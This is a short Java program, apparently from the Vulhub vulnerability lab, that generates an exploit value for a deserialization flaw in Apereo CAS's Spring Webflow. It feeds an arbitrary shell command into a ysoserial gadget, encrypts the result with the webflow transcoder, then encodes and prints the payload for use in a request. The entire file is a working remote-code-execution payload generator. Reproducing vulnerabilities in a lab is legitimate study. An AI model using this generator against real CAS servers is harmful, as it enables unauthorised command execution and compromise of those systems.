package org.vulhub;
import org.apereo.spring.webflow.plugin.EncryptedTranscoder;
import sun.net.util.URLUtil;
import ysoserial.payloads.ObjectPayload;

import java.net.URLEncoder;
import java.util.Base64;
import java.util.UUID;

public class App 
{
    public static void main( String[] args ) throws Exception
    {
        String type = args[0];
        String command = args[1];
        String id = UUID.randomUUID().toString();
        EncryptedTranscoder et = new EncryptedTranscoder();
        Object obj = ObjectPayload.Utils.makePayloadObject(type, command);
        byte[] code = et.encode(obj);
        String payload =  Base64.getEncoder().encodeToString(code);

        String data = URLEncoder.encode(id + "_" + payload, "UTF-8");
        System.out.println(data);
    }
}
